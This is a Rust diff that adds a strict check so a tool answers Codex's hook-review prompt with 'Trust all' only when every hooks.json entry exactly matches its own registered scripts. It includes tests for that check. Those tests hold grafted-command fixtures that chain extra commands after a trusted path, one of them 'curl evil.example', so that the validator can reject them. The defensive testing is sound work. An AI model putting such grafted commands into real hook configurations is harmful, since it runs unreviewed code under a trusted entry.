@@ -1110,9 +1110,97 @@ pub fn register_all_hooks() {
     }
 }
 
+/// codex 核验式信任专用的**结构化**我方判据（评审 P2 收紧，2026-10-03）：
+/// [`command_is_ours`] 的 contains 语义会把 `bash <我方脚本>; /tmp/x.sh` 这类
+/// 嫁接命令也判我方——而本判据的 true 直接驱动「代用户 Trust all」，必须收紧。
+/// 结构匹配 = 命令 trim 后与注册形态**等值**：`<marker>` / `bash <marker>` /
+/// `sh <marker>`（各含引号包裹变体，覆盖 quote_bash_command / helper_command_for
+/// 的含空格形态）。标记集由调用方给（脚本/helper 路径双斜杠形态）。
+fn command_is_pure_ours(command: &str, markers: &[String]) -> bool {
+    let c = command.trim();
+    !c.is_empty()
+        && markers.iter().any(|m| {
+            c == m.as_str()
+                || c == format!("\"{m}\"")
+                || c == format!("bash {m}")
+                || c == format!("sh {m}")
+                || c == format!("bash \"{m}\"")
+                || c == format!("sh \"{m}\"")
+        })
+}
+
+/// codex hooks.json 全条目我方核验（C8 用户在场裁决 2026-10-02：**核验式自动
+/// 信任**）。`~/.codex/hooks.json` 存在且**每个 hook 命令都命中我方注册形态**
+/// （[`command_is_pure_ours`] 结构化等值判据——评审 P2 收紧后 contains 不再
+/// 用于此场景）→ true：新建管线遇「Hooks need review」审查框可代发 '2'
+/// （Trust all——信任的确实是 MAM 自己注册的 hooks，远程创建的状态上报闭环）；
+/// 文件缺失/损坏/空事件/混有非我方条目/嫁接命令（我方路径后接私货）→ false：
+/// esc 跳过（屏面明示 `esc skip`，不信任只解锁 composer，保守不代用户做混杂态
+/// 的信任决定）。
+/// 可见性说明：`pub` + doc(hidden) 仅为集成测试（tests/create_e2e.rs）可达——
+/// 对齐 `inject::e2e_support` 先例；crate 内生产调用走 `pub(crate)` 语义即可。
+#[doc(hidden)]
+pub fn codex_hooks_all_ours(home: &std::path::Path) -> bool {
+    let path = home.join(".codex").join("hooks.json");
+    let Ok(text) = std::fs::read_to_string(&path) else {
+        return false;
+    };
+    let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) else {
+        return false;
+    };
+    let Some(events) = v.get("hooks").and_then(|h| h.as_object()) else {
+        return false;
+    };
+    if events.is_empty() {
+        return false;
+    }
+    // 标记集 = 脚本路径 + helper 落盘路径（.exe/无扩展双候选），各正反斜杠双形态
+    // ——注册形态单一事实源 hook_command_spec_for 的 codex 两形态（command=bash
+    // 脚本 / commandWindows=helper 直启）全覆盖
+    let mut markers = Vec::new();
+    for p in [
+        home.join(".mam").join("hooks").join("status-hook.sh"),
+        home.join(".mam").join("bin").join("mam-hook-listener.exe"),
+        home.join(".mam").join("bin").join("mam-hook-listener"),
+    ] {
+        let s = p.to_string_lossy().to_string();
+        markers.push(s.replace('\\', "/"));
+        markers.push(s.replace('/', "\\"));
+    }
+    events.values().all(|entries| {
+        entries
+            .as_array()
+            .map(|arr| {
+                !arr.is_empty()
+                    && arr.iter().all(|e| {
+                        e.get("hooks")
+                            .and_then(|h| h.as_array())
+                            .map(|hs| {
+                                !hs.is_empty()
+                                    && hs.iter().all(|h| {
+                                        // command 必在且我方；commandWindows 缺席合法
+                                        // （非 Windows 形态），在场也须我方——
+                                        // 结构化等值判据（评审 P2 收紧）
+                                        h.get("command")
+                                            .and_then(|c| c.as_str())
+                                            .map(|s| command_is_pure_ours(s, &markers))
+                                            .unwrap_or(false)
+                                            && h.get("commandWindows")
+                                                .and_then(|c| c.as_str())
+                                                .map(|s| command_is_pure_ours(s, &markers))
+                                                .unwrap_or(true)
+                                    })
+                            })
+                            .unwrap_or(false)
+                    })
+            })
+            .unwrap_or(false)
+    })
+}
+
 #[cfg(test)]
 mod command_quote_tests {
-    use super::quote_bash_command;
+    use super::{codex_hooks_all_ours, quote_bash_command};
 
     #[test]
     fn no_space_path_becomes_forward_slash_unquoted() {
@@ -1121,6 +1209,92 @@ mod command_quote_tests {
         assert_eq!(
             quote_bash_command(r"C:\Users\bunny\.mam\hooks\status-hook.sh"),
             r"bash C:/Users/bunny/.mam/hooks/status-hook.sh"
+        );
+    }
+
+    /// codex hooks 全条目我方核验（C8 核验式自动信任的纯核）：全我方 → true；
+    /// 混入非我方条目 / 文件缺失 → false（esc 跳过保守臂）。fixture 命令必须
+    /// 含 **tempdir 家目录** 的脚本路径——marker 判据按 home 推导
+    #[test]
+    fn codex_hooks_all_ours_verifies_entries() {
+        let td = tempfile::tempdir().unwrap();
+        let cfg = td.path().join(".codex").join("hooks.json");
+        std::fs::create_dir_all(cfg.parent().unwrap()).unwrap();
+        let ours_cmd = format!(
+            "bash {}/.mam/hooks/status-hook.sh",
+            td.path().to_string_lossy().replace('\\', "/")
+        );
+        let ours_win = format!(
+            "{}/.mam/bin/mam-hook-listener.exe",
+            td.path().to_string_lossy().replace('\\', "/")
+        );
+        // JSON 夹具用占位符 + replace 组装（format! 的 JSON 花括号转义不可读）
+        let ours_only = r#"{"hooks":{"PreToolUse":[{"matcher":"","hooks":[{"type":"command","command":"__SCRIPT__","commandWindows":"__WIN__"}]}]}}"#
+            .replace("__SCRIPT__", &ours_cmd)
+            .replace("__WIN__", &ours_win);
+        // 全我方（脚本路径 + Windows helper 双形态，实机 hooks.json 同款形态）
+        std::fs::write(&cfg, &ours_only).unwrap();
+        assert!(codex_hooks_all_ours(td.path()));
+        // 混入非我方条目 → false
+        let mixed = r#"{"hooks":{"PreToolUse":[{"matcher":"","hooks":[{"type":"command","command":"__SCRIPT__","commandWindows":"__WIN__"},{"type":"command","command":"node /tmp/other-tool/hook.js"}]}]}}"#
+            .replace("__SCRIPT__", &ours_cmd)
+            .replace("__WIN__", &ours_win);
+        std::fs::write(&cfg, mixed).unwrap();
+        assert!(!codex_hooks_all_ours(td.path()));
+        // 文件缺失 → false
+        std::fs::remove_file(&cfg).unwrap();
+        assert!(!codex_hooks_all_ours(td.path()));
+    }
+
+    /// 评审 P2 收紧（2026-10-03）：contains 判据会把「我方路径后接私货」的嫁接
+    /// 命令也判我方 → 代用户 Trust all 是不可接受的假阳；结构化等值判据必须拒
+    #[test]
+    fn codex_hooks_all_ours_rejects_grafted_commands() {
+        let td = tempfile::tempdir().unwrap();
+        let cfg = td.path().join(".codex").join("hooks.json");
+        std::fs::create_dir_all(cfg.parent().unwrap()).unwrap();
+        let home_fwd = td.path().to_string_lossy().replace('\\', "/");
+        let ours_win = format!("{home_fwd}/.mam/bin/mam-hook-listener.exe");
+        for graft in [
+            // 我方路径 + 链式私货（contains 时代的假阳形态）
+            format!("bash {home_fwd}/.mam/hooks/status-hook.sh; /tmp/x.sh"),
+            format!("{home_fwd}/.mam/bin/mam-hook-listener.exe && curl evil.example"),
+            // 我方路径仅作参数夹带
+            format!("node /tmp/x.js {home_fwd}/.mam/hooks/status-hook.sh"),
+        ] {
+            let json = r#"{"hooks":{"PreToolUse":[{"matcher":"","hooks":[{"type":"command","command":"__G__","commandWindows":"__WIN__"}]}]}}"#
+                .replace("__G__", &graft)
+                .replace("__WIN__", &ours_win);
+            std::fs::write(&cfg, &json).unwrap();
+            assert!(
+                !codex_hooks_all_ours(td.path()),
+                "嫁接命令必须拒（代用户信任场景不允 contains 假阳）：{graft}"
+            );
+        }
+        // 对照：纯我方形态（bash 脚本 + helper 直启 + 引号包裹变体）仍放行
+        let ok = r#"{"hooks":{"SessionEnd":[{"matcher":"","hooks":[{"type":"command","command":"bash __HOME__/.mam/hooks/status-hook.sh","commandWindows":"__WIN__"}]}]}}"#
+            .replace("__HOME__", &home_fwd)
+            .replace("__WIN__", &ours_win);
+        std::fs::write(&cfg, &ok).unwrap();
+        assert!(codex_hooks_all_ours(td.path()));
+        let ok2 = serde_json::json!({
+            "hooks": {
+                "SessionEnd": [
+                    {
+                        "matcher": "",
+                        "hooks": [
+                            // 含空格路径的注册形态：helper_command_for 会给整路径加引号
+                            {"type": "command", "command": format!("\"{ours_win}\"")}
+                        ]
+                    }
+                ]
+            }
+        })
+        .to_string();
+        std::fs::write(&cfg, &ok2).unwrap();
+        assert!(
+            codex_hooks_all_ours(td.path()),
+            "引号包裹 helper 直启须放行"
         );
     }
 
